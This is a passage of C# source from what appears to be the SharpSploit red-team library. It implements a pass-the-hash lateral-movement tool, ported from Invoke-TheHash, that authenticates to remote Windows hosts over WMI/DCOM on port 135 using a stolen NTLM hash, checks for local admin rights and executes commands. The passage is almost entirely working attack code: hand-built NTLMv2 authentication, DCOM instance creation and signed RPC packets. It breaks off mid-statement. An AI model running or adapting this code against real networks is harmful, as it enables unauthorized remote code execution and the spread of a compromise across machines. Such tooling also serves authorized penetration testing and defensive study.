using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using SharpSploit.Execution;
using SharpSploit.Misc;

namespace SharpSploit.LateralMovement
{
    public class PassTheHash
    {
        /// <summary>
        /// Determines if a username and hash has administrative privilege on a Target
        /// </summary>
        /// <param name="username">The Username to query.</param>
        /// <param name="hash">The NTLM hash for the user</param>
        /// <param name="domain">The logon domain for the user</param>
        /// <param name="Target">The Target to query.</param>
        /// <returns>True for Admin, False for not.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static bool WMIAdminCheck(string username, string hash, string domain, string Target)
        {
            string result = WMIExecute(username, hash, domain, Target, AdminCheck: true);
            if (result.Contains(" is a local administrator on "))
                return true;
            else
                return false;
        }

        /// <summary>
        /// Execute a command against multiple targets using Pass the Hash and WMI
        /// </summary>
        /// <param name="username">The username to log on as.</param>
        /// <param name="hash">The NTLM hash for the user.</param>
        /// <param name="domain">The logon domain for the user.</param>
        /// <param name="targets">The Target computers to run the command on.</param>
        /// <param name="command">The Command to execute on the Target</param>
        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
        /// <param name="AdminCheck">Check if user is an Admin on the Target only.</param>
        /// <param name="debug">Include debug information in the output</param>
        /// <returns>Returns a string containing execution results.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static string WMIExecute(string username, string hash, string domain, List<string> targets, string command = "", int sleep = 15, bool AdminCheck = false, bool debug = false)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var Target in targets)
            {
                sb.AppendLine(WMIExecute(username, hash, domain, Target, command, sleep, AdminCheck, debug));
            }

            return sb.ToString();
        }

        /// <summary>
        /// Execute a command against a Target using Pass the Hash and WMI
        /// </summary>
        /// <param name="username">The username to log on as.</param>
        /// <param name="hash">The NTLM hash for the user.</param>
        /// <param name="domain">The logon domain for the user.</param>
        /// <param name="Target">The Target computers to run the command on.</param>
        /// <param name="command">The Command to execute on the Target.</param>
        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
        /// <param name="AdminCheck">Check if user is an Admin on the Target only.</param>
        /// <param name="debug">Include debug information in the output.</param>
        /// <returns>Returns a string containing execution results.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static string WMIExecute(string username, string hash, string domain, string Target, string command = "", int sleep = 15, bool AdminCheck = false, bool debug = false)
        {
            string Target_Short = String.Empty;
            string processID = BitConverter.ToString(BitConverter.GetBytes(Process.GetCurrentProcess().Id)).Replace("-00-00", "").Replace("-", "");
            string Auth_Hostname = Environment.MachineName;
            string Output_Username = String.Empty;
            string WMI_Random_Port_String = null;
            string Target_Long = String.Empty;
            string WMI_Client_Stage = String.Empty;
            string WMI_Data = String.Empty;
            string OXID = String.Empty;
            StringBuilder output = new StringBuilder();
            int Request_Split_Stage = 0;
            int Request_Length = 0;
            int Sequence_Number_Counter = 0;
            int Request_Split_Index_Tracker = 0;
            int Request_Auth_Padding = 0;
            int OXID_Index = 0;
            int OXID_Bytes_Index = 0;
            int WMI_Random_Port_Int = 0;
            int Target_Process_ID = 0;
            bool success = false;
            IPAddress Target_Type = null;
            byte[] Assoc_Group = null;
            byte[] Object_UUID = null;
            byte[] IPID = null;
            byte[] WMI_Client_Send;
            byte[] Object_UUID2 = null;
            byte[] Sequence_Number = null;
            byte[] Request_Flags = null;
            byte[] Process_ID_Bytes = Utilities.ConvertStringToByteArray(processID);
            byte[] Request_Call_ID = null;
            byte[] Request_Opnum = null;
            byte[] Request_UUID = null;
            byte[] Request_Context_ID = null;
            byte[] Alter_Context_Call_ID = null;
            byte[] Alter_Context_Context_ID = null;
            byte[] Alter_Context_UUID = null;
            byte[] Hostname_Length = null;
            byte[] Stub_Data = null;
            byte[] WMI_Namespace_Length = null;
            byte[] WMI_Namespace_Unicode = null;
            byte[] IPID2 = null;

            if (!string.IsNullOrEmpty(hash) && !string.IsNullOrEmpty(username))
            {
                if (hash.Contains(":"))
                    hash = hash.Split(':').Last();
            }
            else
            {
                return "Missing Required Parameters";
            }


            if (!string.IsNullOrEmpty(domain))
                Output_Username = domain + '\\' + username;
            else
                Output_Username = username;

            if (Target == "localhost")
            {
                Target = "127.0.0.1";
                Target_Long = "127.0.0.1";
            }

            try
            {
                if (debug) { output.AppendLine(String.Format("Connecting to: {0}", Target)); }
                Target_Type = IPAddress.Parse(Target);
                Target_Short = Target_Long = Target;
            }
            catch
            {
                Target_Long = Target;

                if (Target.Contains("."))
                {
                    int Target_Short_index = Target.IndexOf(".");
                    Target_Short = Target.Substring(0, Target_Short_index);
                }
                else
                {
                    Target_Short = Target;
                }
            }

            var WMI_Client = new TcpClient();

            try
            {
                WMI_Client.Connect(Target, 135);
            }
            catch
            {
                return "No Response from: " + Target;
            }

            if (WMI_Client.Connected)
            {
                if (debug) { output.AppendLine(String.Format("Connected to: {0}", Target)); }
                NetworkStream WMI_Client_Stream = WMI_Client.GetStream();
                byte[] WMI_Client_Receive = new byte[2048];
                byte[] RPC_UUID = new byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a };
                OrderedDictionary Packet_RPC = WMIExec.RPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x02 }, new byte[] { 0x00, 0x00 }, RPC_UUID, new byte[] { 0x00, 0x00 });
                Packet_RPC["RPCBind_FragLength"] = new byte[] { 0x74, 0x00 };
                WMI_Client_Receive = SendStream(WMI_Client_Stream, Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC));
                Packet_RPC = WMIExec.RPCRequest(new byte[] { 0x03 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x05, 0x00 }, null);
                WMI_Client_Receive = SendStream(WMI_Client_Stream, Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC));
                string WMI_HostName = BitConverter.ToString(Utilities.GetByteRange(WMI_Client_Receive, 42, WMI_Client_Receive.Length));
                byte[] WMI_Hostname_Bytes = Utilities.ConvertStringToByteArray(WMI_HostName.Substring(0, WMI_HostName.IndexOf("-00-00-00")).Replace("-00", "").Replace("-", "").Replace(" ", ""));
                WMI_Hostname_Bytes = Utilities.GetByteRange(WMI_Hostname_Bytes, 0, WMI_Hostname_Bytes.Length);
                WMI_HostName = Encoding.ASCII.GetString(WMI_Hostname_Bytes);
                if (Target_Short != WMI_HostName)
                {
                    if (debug) { output.AppendLine(String.Format("Switching Target name to {0} due to initial response.", WMI_HostName)); }
                    Target_Short = WMI_HostName;
                }
                WMI_Client.Close();
                WMI_Client_Stream.Close();
                WMI_Client = new TcpClient();
                WMI_Client.ReceiveTimeout = 30000;

                try
                {
                    WMI_Client.Connect(Target_Long, 135);
                }
                catch
                {
                    output.AppendLine(String.Format("No response from {0}", Target));
                    return output.ToString();
                }

                if (WMI_Client.Connected)
                {
                    if (debug) { output.AppendLine(String.Format("ReConnected to: {0} ", Target)); }
                    if (debug) { output.AppendLine("Authenticating"); }
                    WMI_Client_Stream = WMI_Client.GetStream();
                    RPC_UUID = new byte[] { 0xa0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 };
                    Packet_RPC = WMIExec.RPCBind(3, new byte[] { 0xd0, 0x16 }, new byte[] { 0x01 }, new byte[] { 0x01, 0x00 }, RPC_UUID, new byte[] { 0x00, 0x00 });
                    Packet_RPC["RPCBind_FragLength"] = new byte[] { 0x78, 0x00 };
                    Packet_RPC["RPCBind_AuthLength"] = new byte[] { 0x28, 0x00 };
                    Packet_RPC["RPCBind_NegotiateFlags"] = new byte[] { 0x07, 0x82, 0x08, 0xa2 };
                    WMI_Client_Receive = SendStream(WMI_Client_Stream, Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC));
                    string WMI_NTLMSSP = BitConverter.ToString(WMI_Client_Receive).Replace("-", "");
                    int WMI_NTLMSSP_index = WMI_NTLMSSP.IndexOf("4E544C4D53535000");
                    int WMI_NTLMSSP_bytes_index = WMI_NTLMSSP_index / 2;
                    int WMI_Domain_Length = Utilities.DataLength(WMI_NTLMSSP_bytes_index + 12, WMI_Client_Receive);
                    int WMI_target_Length = Utilities.DataLength(WMI_NTLMSSP_bytes_index + 40, WMI_Client_Receive);
                    byte[] WMI_NTLM_Challenge = Utilities.GetByteRange(WMI_Client_Receive, WMI_NTLMSSP_bytes_index + 24, WMI_NTLMSSP_bytes_index + 31);
                    byte[] WMI_Target_Details = Utilities.GetByteRange(WMI_Client_Receive, WMI_NTLMSSP_bytes_index + 56 + WMI_Domain_Length, WMI_NTLMSSP_bytes_index + 55 + WMI_Domain_Length + WMI_target_Length);
                    byte[] WMI_Target_Time_Bytes = Utilities.GetByteRange(WMI_Target_Details, WMI_Target_Details.Length - 12, WMI_Target_Details.Length - 5);
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < hash.Length - 1; i += 2) { sb.Append(hash.Substring(i, 2) + "-"); };
                    byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
                    byte[] Auth_Hostname_Bytes = Encoding.Unicode.GetBytes(Auth_Hostname);
                    byte[] Auth_Domain_Bytes = Encoding.Unicode.GetBytes(domain);
                    byte[] Auth_Username_Bytes = Encoding.Unicode.GetBytes(username);
                    byte[] Auth_Domain_Length = BitConverter.GetBytes(Auth_Domain_Bytes.Length);
                    Auth_Domain_Length = new byte[] { Auth_Domain_Length[0], Auth_Domain_Length[1] };
                    byte[] Auth_Username_Length = BitConverter.GetBytes(Auth_Username_Bytes.Length);
                    Auth_Username_Length = new byte[] { Auth_Username_Length[0], Auth_Username_Length[1] };
                    byte[] Auth_Hostname_Length = BitConverter.GetBytes(Auth_Hostname_Bytes.Length);
                    Auth_Hostname_Length = new byte[] { Auth_Hostname_Length[0], Auth_Hostname_Length[1] };
                    byte[] Auth_Domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                    byte[] Auth_Username_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + 64);
                    byte[] Auth_Hostname_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + 64);
                    byte[] Auth_LM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 64);
                    byte[] Auth_NTLM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 88);
                    HMACMD5 HMAC_MD5 = new HMACMD5();
                    HMAC_MD5.Key = NTLM_hash_bytes;
                    string Username_And_Target = username.ToUpper();
                    byte[] Username_Bytes = Encoding.Unicode.GetBytes(Username_And_Target);
                    byte[] Username_And_Target_bytes = Username_Bytes.Concat(Auth_Domain_Bytes).ToArray<byte>();
                    byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(Username_And_Target_bytes);
                    Random r = new Random();
                    byte[] Client_Challenge_Bytes = new byte[8];
                    r.NextBytes(Client_Challenge_Bytes);
                    byte[] Security_Blob_Bytes = (new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                        .Concat(WMI_Target_Time_Bytes)
                        .Concat(Client_Challenge_Bytes)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                        .Concat(WMI_Target_Details)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                    
                    byte[] Server_Challenge_And_Security_Blob_Bytes = WMI_NTLM_Challenge.Concat(Security_Blob_Bytes).ToArray();
                    HMAC_MD5.Key = NTLMv2_hash;
                    byte[] NTLMv2_Response = HMAC_MD5.ComputeHash(Server_Challenge_And_Security_Blob_Bytes);
                    byte[] Session_Base_Key = HMAC_MD5.ComputeHash(NTLMv2_Response);
                    NTLMv2_Response = NTLMv2_Response.Concat(Security_Blob_Bytes).ToArray();
                    byte[] NTLMv2_Response_Length = BitConverter.GetBytes(NTLMv2_Response.Length);
                    NTLMv2_Response_Length = new byte[] { NTLMv2_Response_Length[0], NTLMv2_Response_Length[1] };
                    byte[] WMI_Session_Key_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + NTLMv2_Response.Length + 88);
                    byte[] WMI_Session_Key_Length = new byte[] { 0x00, 0x00 };
                    byte[] WMI_Negotiate_Flags = new byte[] { 0x15, 0x82, 0x88, 0xa2 };
                    
                    byte[] NTLMSSP_response = (new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 })
                        .Concat(Auth_LM_Offset)
                        .Concat(NTLMv2_Response_Length)
                        .Concat(NTLMv2_Response_Length)
                        .Concat(Auth_NTLM_Offset)
                        .Concat(Auth_Domain_Length)
                        .Concat(Auth_Domain_Length)
                        .Concat(Auth_Domain_offset)
                        .Concat(Auth_Username_Length)
                        .Concat(Auth_Username_Length)
                        .Concat(Auth_Username_Offset)
                        .Concat(Auth_Hostname_Length)
                        .Concat(Auth_Hostname_Length)
                        .Concat(Auth_Hostname_Offset)
                        .Concat(WMI_Session_Key_Length)
                        .Concat(WMI_Session_Key_Length)
                        .Concat(WMI_Session_Key_Offset)
                        .Concat(WMI_Negotiate_Flags)
                        .Concat(Auth_Domain_Bytes)
                        .Concat(Auth_Username_Bytes)
                        .Concat(Auth_Hostname_Bytes)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                        .Concat(NTLMv2_Response).ToArray();

                    Packet_RPC = WMIExec.RPCAuth3(NTLMSSP_response);
                    WMI_Client_Send = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC);
                    WMI_Client_Stream.Write(WMI_Client_Send, 0, WMI_Client_Send.Length);
                    WMI_Client_Stream.Flush();
                    byte[] Causality_ID_Bytes = new byte[16];
                    r.NextBytes(Causality_ID_Bytes);
                    OrderedDictionary Packet_DCOM_Remote_Create_Instance = WMIExec.DCOMRemoteCreateInstance(Causality_ID_Bytes, Target_Short);
                    byte[] DCOM_Remote_Create_Instance = Utilities.ConvertFromPacketOrderedDictionary(Packet_DCOM_Remote_Create_Instance);
                    Packet_RPC = WMIExec.RPCRequest(new byte[] { 0x03 }, DCOM_Remote_Create_Instance.Length, 0, 0, new byte[] { 0x03, 0x00, 0x00, 0x00 }, new byte[] { 0x01, 0x00 }, new byte[] { 0x04, 0x00 }, null);
                    WMI_Client_Send = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC).Concat(DCOM_Remote_Create_Instance).ToArray();
                    WMI_Client_Receive = SendStream(WMI_Client_Stream, WMI_Client_Send);
                    TcpClient WMI_Client_Random_Port = new TcpClient();
                    WMI_Client_Random_Port.Client.ReceiveTimeout = 30000;

                    if (WMI_Client_Receive[2] == 3 && BitConverter.ToString(Utilities.GetByteRange(WMI_Client_Receive, 24, 27)) == "05-00-00-00")
                    {
                        output.AppendLine("WMI Access Denied");
                        return output.ToString();
                    }
                    else if (WMI_Client_Receive[2] == 3)
                    {
                        string Error_Code = BitConverter.ToString(new byte[] { WMI_Client_Receive[27], WMI_Client_Receive[26], WMI_Client_Receive[25], WMI_Client_Receive[24] });
                        string[] Error_Code_Array = Error_Code.Split('-');
                        Error_Code = string.Join("", Error_Code_Array);
                        output.AppendLine(String.Format("Error Code: 0x{0}", Error_Code.ToString()));
                        return output.ToString();
                    }
                    else if (WMI_Client_Receive[2] == 2 && AdminCheck)
                    {
                        output.AppendLine(String.Format("{0} is a local administrator on {1}", Output_Username, Target_Long));
                        if (debug) { output.AppendLine("Exiting due to AdminCheck being set"); }
                        return output.ToString();
                    }
                    else if (WMI_Client_Receive[2] == 2 && !AdminCheck)
                    {
                        if (debug) { output.AppendLine("Continuing since AdminCheck is false"); }
                        if (Target_Short == "127.0.0.1")
                        {
                            Target_Short = Auth_Hostname;
                        }
                        byte[] Target_Unicode = (new byte[] { 0x07, 0x00 }).Concat(Encoding.Unicode.GetBytes(Target_Short + "[")).ToArray();
                        string Target_Search = BitConverter.ToString(Target_Unicode).Replace("-", "");
                        string WMI_message = BitConverter.ToString(WMI_Client_Receive).Replace("-", "");
                        int Target_Index = WMI_message.IndexOf(Target_Search);

                        if (Target_Index < 1)
                        {
                            IPAddress[] Target_Address_List = Dns.GetHostEntry(Target_Long).AddressList;
                            foreach (IPAddress ip in Target_Address_List)
                            {
                                Target_Short = ip.Address.ToString();
                                Target_Search = BitConverter.ToString(Target_Unicode).Replace("-", "");
                                Target_Index = WMI_message.IndexOf(Target_Search);

                                if (Target_Index >= 0)
                                {
                                    break;
                                }
                            }
                        }

                        if (Target_Index > 0)
                        {
                            int Target_Bytes_Index = Target_Index / 2;
                            byte[] WMI_Random_Port_Bytes = Utilities.GetByteRange(WMI_Client_Receive, Target_Bytes_Index + Target_Unicode.Length, Target_Bytes_Index + Target_Unicode.Length + 8);
                            WMI_Random_Port_String = BitConverter.ToString(WMI_Random_Port_Bytes);
                            int WMI_Random_Port_End_Index = WMI_Random_Port_String.IndexOf("-5D");
                            if (WMI_Random_Port_End_Index > 0)
                            {
                                WMI_Random_Port_String = WMI_Random_Port_String.Substring(0, WMI_Random_Port_End_Index);
                            }
                            WMI_Random_Port_String = WMI_Random_Port_String.Replace("-00", "").Replace("-", "");
                            char[] Random_Port_Char_Array = WMI_Random_Port_String.ToCharArray();
                            char[] chars;
                            try
                            {
                                chars = new char[] { Random_Port_Char_Array[1], Random_Port_Char_Array[3], Random_Port_Char_Array[5], Random_Port_Char_Array[7], Random_Port_Char_Array[9] };
                            }
                            catch
                            {
                                chars = new char[] { Random_Port_Char_Array[1], Random_Port_Char_Array[3], Random_Port_Char_Array[5], Random_Port_Char_Array[7] };
                            }
                            WMI_Random_Port_Int = int.Parse(new string(chars));
                            string Reverse = BitConverter.ToString(WMI_Client_Receive).Replace("-", "");
                            int Reverse_Index = Reverse.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820");
                            int Reverse_Bytes_Index = Reverse_Index / 2;
                            byte[] OXID_bytes = Utilities.GetByteRange(WMI_Client_Receive, Reverse_Bytes_Index + 32, Reverse_Bytes_Index + 39);
                            IPID = Utilities.GetByteRange(WMI_Client_Receive, Reverse_Bytes_Index + 48, Reverse_Bytes_Index + 63);
                            OXID = BitConverter.ToString(OXID_bytes).Replace("-", "");
                            OXID_Index = Reverse.IndexOf(OXID, Reverse_Index + 100);
                            OXID_Bytes_Index = OXID_Index / 2;
                            Object_UUID = Utilities.GetByteRange(WMI_Client_Receive, OXID_Bytes_Index + 12, OXID_Bytes_Index + 27);
                        }
                        if (WMI_Random_Port_Int != 0)
                        {
                            try
                            {
                                WMI_Client_Random_Port.Connect(Target_Long, WMI_Random_Port_Int);
                            }
                            catch
                            {
                                output.AppendLine(String.Format("{0}:{1} did not respond", Target_Long, WMI_Random_Port_Int));
                                return output.ToString();
                            }
                        }
                        else
                        {
                            output.AppendLine(String.Format("Random port extraction failure"));
                            return output.ToString();
                        }
                    }
                    else
                    {
                        output.AppendLine("An Unkonwn Error Occured");
                        return output.ToString();
                    }

                    if (WMI_Client_Random_Port.Connected)
                    {
                        if (debug) { output.AppendLine(String.Format("Connected to: {0} using port {1}", Target_Long, WMI_Random_Port_Int)); }
                        NetworkStream WMI_Client_Random_Port_Stream = WMI_Client_Random_Port.GetStream();
                        Packet_RPC = WMIExec.RPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x03 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }, new byte[] { 0x00, 0x00 });
                        Packet_RPC["RPCBind_FragLength"] = new byte[] { 0xd0, 0x00 };
                        Packet_RPC["RPCBind_AuthLength"] = new byte[] { 0x28, 0x00 };
                        Packet_RPC["RPCBind_NegotiateFlags"] = new byte[] { 0x97, 0x82, 0x08, 0xa2 };
                        WMI_Client_Send = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC);
                        WMI_Client_Receive = SendStream(WMI_Client_Random_Port_Stream, WMI_Client_Send);
                        Assoc_Group = Utilities.GetByteRange(WMI_Client_Receive, 20, 23);
                        WMI_NTLMSSP = BitConverter.ToString(WMI_Client_Receive).Replace("-", "");
                        WMI_NTLMSSP_index = WMI_NTLMSSP.IndexOf("4E544C4D53535000");
                        WMI_NTLMSSP_bytes_index = WMI_NTLMSSP_index / 2;
                        WMI_Domain_Length = Utilities.DataLength(WMI_NTLMSSP_bytes_index + 12, WMI_Client_Receive);
                        WMI_target_Length = Utilities.DataLength(WMI_NTLMSSP_bytes_index + 40, WMI_Client_Receive);
                        WMI_NTLM_Challenge = Utilities.GetByteRange(WMI_Client_Receive, WMI_NTLMSSP_bytes_index + 24, WMI_NTLMSSP_bytes_index + 31);
                        WMI_Target_Details = Utilities.GetByteRange(WMI_Client_Receive, WMI_NTLMSSP_bytes_index + 56 + WMI_Domain_Length, WMI_NTLMSSP_bytes_index + 55 + WMI_Domain_Length + WMI_target_Length);
                        WMI_Target_Time_Bytes = Utilities.GetByteRange(WMI_Target_Details, WMI_Target_Details.Length - 12, WMI_Target_Details.Length - 5);
                        sb = new StringBuilder();
                        for (int i = 0; i < hash.Length - 1; i += 2) { sb.Append(hash.Substring(i, 2) + "-"); };
                        NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
                        Auth_Hostname = Environment.MachineName;
                        Auth_Hostname_Bytes = Encoding.Unicode.GetBytes(Auth_Hostname);
                        Auth_Domain_Bytes = Encoding.Unicode.GetBytes(domain);
                        Auth_Username_Bytes = Encoding.Unicode.GetBytes(username);
                        Auth_Domain_Length = BitConverter.GetBytes(Auth_Domain_Bytes.Length);
                        Auth_Domain_Length = new byte[] { Auth_Domain_Length[0], Auth_Domain_Length[1] };
                        Auth_Username_Length = BitConverter.GetBytes(Auth_Username_Bytes.Length);
                        Auth_Username_Length = new byte[] { Auth_Username_Length[0], Auth_Username_Length[1] };
                        Auth_Hostname_Length = BitConverter.GetBytes(Auth_Hostname_Bytes.Length);
                        Auth_Hostname_Length = new byte[] { Auth_Hostname_Length[0], Auth_Hostname_Length[1] };
                        Auth_Domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                        Auth_Username_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + 64);
                        Auth_Hostname_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + 64);
                        Auth_LM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 64);
                        Auth_NTLM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 88);
                        HMAC_MD5 = new HMACMD5();
                        HMAC_MD5.Key = NTLM_hash_bytes;
                        Username_And_Target = username.ToUpper();
                        Username_Bytes = Encoding.Unicode.GetBytes(Username_And_Target);
                        Username_And_Target_bytes = Username_Bytes.Concat(Auth_Domain_Bytes).ToArray();
                        NTLMv2_hash = HMAC_MD5.ComputeHash(Username_And_Target_bytes);
                        r = new Random();
                        Client_Challenge_Bytes = new byte[8];
                        r.NextBytes(Client_Challenge_Bytes);
                        
                        Security_Blob_Bytes = (new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                        .Concat(WMI_Target_Time_Bytes)
                        .Concat(Client_Challenge_Bytes)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                        .Concat(WMI_Target_Details)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();

                        Server_Challenge_And_Security_Blob_Bytes = WMI_NTLM_Challenge.Concat(Security_Blob_Bytes).ToArray();
                        HMAC_MD5.Key = NTLMv2_hash;
                        NTLMv2_Response = HMAC_MD5.ComputeHash(Server_Challenge_And_Security_Blob_Bytes);
                        Session_Base_Key = HMAC_MD5.ComputeHash(NTLMv2_Response);
                        byte[] Clignt_Signing_Constant = new byte[] { 0x73, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e, 0x20, 0x6b, 0x65, 0x79, 0x20, 0x74, 0x6f, 0x20, 0x63, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x2d, 0x74, 0x6f, 0x2d, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x20, 0x73, 0x69, 0x67, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x6b, 0x65, 0x79, 0x20, 0x6d, 0x61, 0x67, 0x69, 0x63, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x74, 0x00 };
                        MD5CryptoServiceProvider MD5_crypto = new MD5CryptoServiceProvider();
                        byte[] Client_Signing_Key = MD5_crypto.ComputeHash(Session_Base_Key.Concat(Clignt_Signing_Constant).ToArray());
                        NTLMv2_Response = NTLMv2_Response.Concat(Security_Blob_Bytes).ToArray();
                        NTLMv2_Response_Length = BitConverter.GetBytes(NTLMv2_Response.Length);
                        NTLMv2_Response_Length = new byte[] { NTLMv2_Response_Length[0], NTLMv2_Response_Length[1] };
                        WMI_Session_Key_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + NTLMv2_Response.Length + 88);
                        WMI_Session_Key_Length = new byte[] { 0x00, 0x00 };
                        WMI_Negotiate_Flags = new byte[] { 0x15, 0x82, 0x88, 0xa2 };
                        NTLMSSP_response = (new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 })
                            .Concat(Auth_LM_Offset)
                            .Concat(NTLMv2_Response_Length)
                            .Concat(NTLMv2_Response_Length)
                            .Concat(Auth_NTLM_Offset)
                            .Concat(Auth_Domain_Length)
                            .Concat(Auth_Domain_Length)
                            .Concat(Auth_Domain_offset)
                            .Concat(Auth_Username_Length)
                            .Concat(Auth_Username_Length)
                            .Concat(Auth_Username_Offset)
                            .Concat(Auth_Hostname_Length)
                            .Concat(Auth_Hostname_Length)
                            .Concat(Auth_Hostname_Offset)
                            .Concat(WMI_Session_Key_Length)
                            .Concat(WMI_Session_Key_Length)
                            .Concat(WMI_Session_Key_Offset)
                            .Concat(WMI_Negotiate_Flags)
                            .Concat(Auth_Domain_Bytes)
                            .Concat(Auth_Username_Bytes)
                            .Concat(Auth_Hostname_Bytes)
                            .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                            .Concat(NTLMv2_Response).ToArray();

                        HMAC_MD5.Key = Client_Signing_Key;
                        Sequence_Number = new byte[] { 0x00, 0x00, 0x00, 0x00 };
                        Packet_RPC = WMIExec.RPCAuth3(NTLMSSP_response);
                        Packet_RPC["RPCAUTH3_CallID"] = new byte[] { 0x02, 0x00, 0x00, 0x00 };
                        Packet_RPC["RPCAUTH3_AuthLevel"] = new byte[] { 0x04 };
                        WMI_Client_Send = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC);
                        WMI_Client_Random_Port_Stream.Write(WMI_Client_Send, 0, WMI_Client_Send.Length);
                        WMI_Client_Random_Port_Stream.Flush();
                        
                        Packet_RPC = WMIExec.RPCRequest(new byte[] { 0x83 }, 76, 16, 4, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x03, 0x00 }, Object_UUID);
                        OrderedDictionary Packet_Rem_Query_Interface = WMIExec.DCOMRemQueryInterface(Causality_ID_Bytes, IPID, new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 });
                        OrderedDictionary Packet_NTLMSSP_Verifier = WMIExec.NTLMSSPVerifier(4, new byte[] { 0x04 }, Sequence_Number);
                        byte[] Rem_Query_Interface = Utilities.ConvertFromPacketOrderedDictionary(Packet_Rem_Query_Interface);
                        byte[] NTLMSSP_Verifier = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Verifier);
                        HMAC_MD5.Key = Client_Signing_Key;
                        byte[] RPC_Sign = Sequence_Number.Concat(Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC))
                            .Concat(Rem_Query_Interface)
